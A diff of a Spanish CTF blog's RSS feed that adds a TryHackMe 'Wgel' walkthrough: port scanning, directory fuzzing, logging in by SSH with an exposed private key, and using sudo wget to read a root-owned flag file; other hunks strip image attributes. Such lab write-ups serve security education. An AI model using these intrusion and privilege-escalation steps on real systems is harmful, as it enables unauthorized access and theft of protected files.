@@ -6,7 +6,133 @@
         <description>Recent content in THM on d3b0o</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 21 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/categories/thm/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 28 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/categories/thm/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución Wgel</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/</link>
+        <pubDate>Wed, 28 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/images/2.png" alt="Featured image of post Resolución Wgel" /&gt;&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.176.77&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.176.77
+PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data.
+64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms
+
+--- 10.10.176.77 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.176.77 -oG allPort
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.176.77
+   5   │     [*] Open ports: 22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p22,80 -sC -sV 10.10.176.77 -oN target
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94961b66801b7648682d14b59a01aaaa (RSA)
+|   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
+|_  256 b90b972e459bf32a4b11c7831033e0ce (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;web&#34;&gt;Web&lt;/h3&gt;
+&lt;p&gt;En el puerto 80 está corriendo una web, con el &lt;code&gt;whatweb&lt;/code&gt; podemos ver un poco de información sobre la web.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ whatweb 10.10.176.77
+http://10.10.176.77 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.176.77], Title[Apache2 Ubuntu Default Page: It works]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Con &lt;code&gt;ctrl + u&lt;/code&gt; podemos ver el código de la web en el cual se ve una línea comentada con un mensaje: &lt;code&gt;&amp;lt;!-- Jessie don&#39;t forget to udate the webiste --&amp;gt;&lt;/code&gt; Con esto podemos intuir que hay un usuario llamado &lt;strong&gt;Jessie&lt;/strong&gt;&lt;/p&gt;
+&lt;h4 id=&#34;wfuzz-y-gobuster-subdirectorios&#34;&gt;wfuzz y gobuster (subdirectorios)&lt;/h4&gt;
+&lt;p&gt;Con wfuzz vamos a buscar subdirectorios mediante un diccionario ubicado en &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; con el siguiente comando&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.176.77/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos reporta el subdirectorio &lt;code&gt;/sitemap&lt;/code&gt; en el cual hay una web con muchos apartados.
+Con wfuzz otra vez, vamos a buscar subdirectorios sobre el directorio &lt;code&gt;sitemap&lt;/code&gt;, mediante el mismo comando, pero cambiando la ubicación: de &lt;code&gt;10.10.176.77/FUZZ&lt;/code&gt; a &lt;code&gt;10.10.176.77/sitemap/FUZZ&lt;/code&gt;. No ha encontrado nada, probamos con gobuster y otro diccionario el cual está ubicado en &lt;code&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -u http://10.10.176.77/sitemap/ -w /usr/share/wordlists/dirb/common.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;infiltración&#34;&gt;Infiltración&lt;/h2&gt;
+&lt;p&gt;Ahora nos reporta varios subdirectorios, entre ellos un .ssh, el cual contiene una &lt;em&gt;rsa private key&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Para conectarnos por ssh la vamos a guardar en un archivo llamado &lt;code&gt;id_rsa&lt;/code&gt;, y nos vamos a conectar con el usuario Jessie que encontramos anteriormente y la llave que encontramos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod 600 id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;ssh -i id_rsa jessie@10.10.176.77
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;user-flag&#34;&gt;User Flag&lt;/h2&gt;
+&lt;p&gt;Podemos ver la flag en /home/jessie/Documents/user_flag.txt.&lt;/p&gt;
+&lt;h2 id=&#34;root-flag&#34;&gt;Root Flag&lt;/h2&gt;
+&lt;p&gt;Con un sudo -l podemos ver que podemos ejecutar wget como root sin proporcionar contraseña. En &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/wget/#shell&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://gtfobins.github.io/gtfobins/wget/#shell&lt;/a&gt; Podemos ver que hay una forma de leer archivos aprovechándonos del wget . Intuyendo que la flag está en /root/root_flag.txt, con los siguientes comandos deberíamos de poder leerlo&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;LFILE=/root/root_flag.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;wget -i $LFILE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos la flag!!!&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Resolución Gallery</title>
         <link>https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/</link>
         <pubDate>Wed, 21 Dec 2022 00:00:00 +0000</pubDate>
@@ -140,7 +266,7 @@ http://10.10.110.190 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/login.png&#34;
 	width=&#34;509&#34;
 	height=&#34;371&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/login_hu5cfa5e12c6956a57c27f6c93754adb0c_18005_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/login_hu5cfa5e12c6956a57c27f6c93754adb0c_18005_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -154,7 +280,7 @@ http://10.10.110.190 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/admin-panel.png&#34;
 	width=&#34;1234&#34;
 	height=&#34;544&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/admin-panel_hub0df3afe1af927c1129dd46afaa77a43_112470_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/admin-panel_hub0df3afe1af927c1129dd46afaa77a43_112470_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -167,7 +293,7 @@ http://10.10.110.190 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/sample-images.png&#34;
 	width=&#34;1217&#34;
 	height=&#34;425&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/sample-images_hu6e0f5c9916f0c6b48464a715e6e29bf1_160607_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/sample-images_hu6e0f5c9916f0c6b48464a715e6e29bf1_160607_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -180,7 +306,7 @@ http://10.10.110.190 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/profile.png&#34;
 	width=&#34;1114&#34;
 	height=&#34;304&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/profile_hu2f9218f1fc3144225108cd74fe098bfa_18219_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/profile_hu2f9218f1fc3144225108cd74fe098bfa_18219_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -327,7 +453,7 @@ http://10.10.193.138 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[A
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal.png&#34;
 	width=&#34;1834&#34;
 	height=&#34;417&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal_huc6b174745ebc0090e690d4f12e04ad03_58746_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal_huc6b174745ebc0090e690d4f12e04ad03_58746_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -340,7 +466,7 @@ http://10.10.193.138 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[A
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal2.png&#34;
 	width=&#34;254&#34;
 	height=&#34;232&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal2_huf238a89a3a7bb233398a1aa87a6d3e04_10854_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/terminal2_huf238a89a3a7bb233398a1aa87a6d3e04_10854_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -404,7 +530,7 @@ key-1-of-3.txt
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/invalid-username.png&#34;
 	width=&#34;444&#34;
 	height=&#34;605&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/invalid-username_hu4cfba9e249384bf4123948e9d57012cf_21228_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/invalid-username_hu4cfba9e249384bf4123948e9d57012cf_21228_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -429,7 +555,7 @@ key-1-of-3.txt
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/panel.png&#34;
 	width=&#34;1885&#34;
 	height=&#34;863&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/panel_hue682a41fbe104edbe4c2b0a6a195332e_63822_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/panel_hue682a41fbe104edbe4c2b0a6a195332e_63822_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -443,7 +569,7 @@ key-1-of-3.txt
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/posts.png&#34;
 	width=&#34;1230&#34;
 	height=&#34;657&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/posts_hu46e5db3da9cc99a45767f9e849fe2838_33256_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/posts_hu46e5db3da9cc99a45767f9e849fe2838_33256_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -456,7 +582,7 @@ key-1-of-3.txt
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/media.png&#34;
 	width=&#34;503&#34;
 	height=&#34;297&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/media_hu2c2653a909d3ecf4211f35a7a87fecc5_77232_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/media_hu2c2653a909d3ecf4211f35a7a87fecc5_77232_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -470,7 +596,7 @@ key-1-of-3.txt
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/editor.png&#34;
 	width=&#34;251&#34;
 	height=&#34;751&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/editor_hud2130b854e8897936150d0db001ca20e_34698_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/editor_hud2130b854e8897936150d0db001ca20e_34698_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -483,7 +609,7 @@ key-1-of-3.txt
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/404.png&#34;
 	width=&#34;824&#34;
 	height=&#34;750&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/404_hu0a82ca82a0dd064b141918fe3e1c9afd_73951_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/404_hu0a82ca82a0dd064b141918fe3e1c9afd_73951_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -655,7 +781,7 @@ root
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/unnamed.png&#34;
 	width=&#34;512&#34;
 	height=&#34;512&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/unnamed_hu0dc3f27283eb59cc7b031c55d2dbe4d5_175923_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/unnamed_hu0dc3f27283eb59cc7b031c55d2dbe4d5_175923_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;nmap&#34;
@@ -880,7 +1006,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/burp.png&#34;
 	width=&#34;1234&#34;
 	height=&#34;283&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/burp_hub9719e1196e71642980343b1fd34ebc6_46762_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/burp_hub9719e1196e71642980343b1fd34ebc6_46762_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -893,7 +1019,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/payloads.png&#34;
 	width=&#34;654&#34;
 	height=&#34;337&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/payloads_hu948607fb97def4fb3defed0701f7d332_18982_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/payloads_hu948607fb97def4fb3defed0701f7d332_18982_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -906,7 +1032,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/atack.png&#34;
 	width=&#34;785&#34;
 	height=&#34;200&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/atack_hud33e5c8bee9f56988b5436bc76c1184f_11430_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/atack_hud33e5c8bee9f56988b5436bc76c1184f_11430_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -1555,7 +1681,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/web.png&#34;
 	width=&#34;1394&#34;
 	height=&#34;914&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/web_hud07c474980d2c4951b53048ba51643d1_233644_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/web_hud07c474980d2c4951b53048ba51643d1_233644_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -1609,7 +1735,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/content.png&#34;
 	width=&#34;723&#34;
 	height=&#34;228&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/content_hu64fb17c600ce79a9e5265150f9c9ccca_33410_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/content_hu64fb17c600ce79a9e5265150f9c9ccca_33410_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -1657,7 +1783,7 @@ Session completed.
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/login.png&#34;
 	width=&#34;475&#34;
 	height=&#34;552&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/login_hudc3ac5b7b238861a7a9c5f13b9a3dcc4_37617_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/login_hudc3ac5b7b238861a7a9c5f13b9a3dcc4_37617_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -1679,7 +1805,7 @@ $port = 443;       // CHANGE THIS
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/php.png&#34;
 	width=&#34;700&#34;
 	height=&#34;37&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/php_hua92a860ce080c2cecc3020e3d2f1ef90_8935_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/php_hua92a860ce080c2cecc3020e3d2f1ef90_8935_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -1694,7 +1820,7 @@ $port = 443;       // CHANGE THIS
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/phtml.png&#34;
 	width=&#34;1665&#34;
 	height=&#34;92&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/phtml_hu7bc985ed96d533f4a4391fdc4461188c_11427_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/phtml_hu7bc985ed96d533f4a4391fdc4461188c_11427_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2220,7 +2346,7 @@ http://10.10.250.47 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPS
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/login.png&#34;
 	width=&#34;742&#34;
 	height=&#34;639&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2246,7 +2372,7 @@ ftp&amp;gt;
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/gum.png&#34;
 	width=&#34;1543&#34;
 	height=&#34;872&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2287,7 +2413,7 @@ john --show mihash.hash
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/remote.png&#34;
 	width=&#34;657&#34;
 	height=&#34;360&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2369,7 +2495,7 @@ john --show mihash.hash
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/root.png&#34;
 	width=&#34;887&#34;
 	height=&#34;1000&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2527,7 +2653,7 @@ http://10.10.108.243 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERV
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/rootme.png&#34;
 	width=&#34;1288&#34;
 	height=&#34;593&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/rootme_hu5665040edcd268205a664a1af8498659_25861_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/rootme_hu5665040edcd268205a664a1af8498659_25861_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2584,7 +2710,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload.png&#34;
 	width=&#34;784&#34;
 	height=&#34;431&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload_hu278b080b4d35e596917f41312a93f175_21808_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload_hu278b080b4d35e596917f41312a93f175_21808_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2597,7 +2723,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads.png&#34;
 	width=&#34;380&#34;
 	height=&#34;248&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads_hu215178249d635ff96931ac571d426b42_20226_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads_hu215178249d635ff96931ac571d426b42_20226_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2620,7 +2746,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/error-php.png&#34;
 	width=&#34;675&#34;
 	height=&#34;576&#34;
